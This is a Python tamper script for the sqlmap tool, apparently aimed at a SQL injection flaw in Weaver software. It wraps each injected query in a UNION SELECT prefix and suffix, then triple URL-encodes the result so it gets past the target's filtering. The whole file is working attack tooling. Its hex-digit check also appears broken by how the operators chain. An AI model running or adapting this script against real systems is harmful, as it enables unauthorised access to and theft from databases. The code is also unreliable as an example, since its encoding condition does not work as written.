#!/usr/bin/env python
import string
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__ = PRIORITY.LOW
 
def dependencies():
    singleTimeWarnMessage("tripleurlencode-weaver-qvd20230512")
 
def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        prefix="a' union select 1,''+("
        subfix=")+'"
        retVal = ""
        payload=prefix+payload+subfix
        i = 0
        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 4) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits+payload[i + 3:i + 4] in string.hexdigits+payload[i + 4:i + 5] in string.hexdigits:
                retVal += '%%25%s' % payload[i + 1:i + 5]
                i += 5
            else:
                retVal += '%%2525%.2X' % ord(payload[i])
                i += 1
    return retVal
